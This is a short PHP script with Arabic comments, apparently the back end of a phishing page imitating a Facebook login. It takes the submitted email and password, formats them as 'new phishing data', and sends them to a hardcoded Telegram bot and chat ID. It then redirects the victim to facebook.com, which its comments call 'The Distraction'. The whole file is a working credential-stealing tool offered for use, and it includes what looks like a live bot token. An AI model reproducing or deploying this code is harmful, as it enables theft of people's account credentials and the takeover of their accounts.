<?php
// login.php - المُرسِل الصامت إلى تليجرام

// =========================================================
// 1. إعدادات تليجرام (The Dark Channels)
// =========================================================
$BOT_TOKEN = "7982406864:AAHqTCTV-6-9WDpTN9q_R-aAk-SMzfmU6e4"; // <--- استبدل برمز البوت الخاص بك
$CHAT_ID = "6226976238";     // <--- استبدل بمعرف الدردشة الخاص بك
$REDIRECT_URL = "https://www.facebook.com/"; // <--- رابط إعادة التوجيه النهائي (الوجهة الأصلية)
// =========================================================

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 2. استقبال وتنظيف البيانات
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // 3. صياغة الرسالة (The Payload)
    $message = "🔥 *بيانات اصطياد جديدة!* 🔥\n";
    $message .= "=============================\n";
    $message .= "📧 *البريد/المستخدم:* `{$email}`\n";
    $message .= "🔑 *كلمة السر:* `{$password}`\n";
    $message .= "⏰ *الوقت:* " . date("Y-m-d H:i:s");
    
    // يجب ترميز الرسالة URL-encoding
    $encoded_message = urlencode($message);
    
    // 4. بناء رابط API لإرسال الرسالة
    $telegram_api_url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?chat_id={$CHAT_ID}&text={$encoded_message}&parse_mode=Markdown";
    
    // 5. إرسال البيانات عبر API
    // يمكن استخدام curl بدل file_get_contents لأداء أفضل وأمان أكبر، لكن هذا أبسط.
    $response = @file_get_contents($telegram_api_url);
    
    // فحص بسيط للرد (اختياري)
    if ($response === FALSE) {
        // يمكن تسجيل خطأ هنا إذا فشل الإرسال
        // error_log("Failed to send message to Telegram API.");
    }
    
    // 6. إعادة توجيه الضحية (The Distraction)
    header("Location: " . $REDIRECT_URL);
    exit();
} else {
    // توجيه المستخدمين الذين يصلون مباشرة
    header("Location: index.html");
    exit();
}
?>
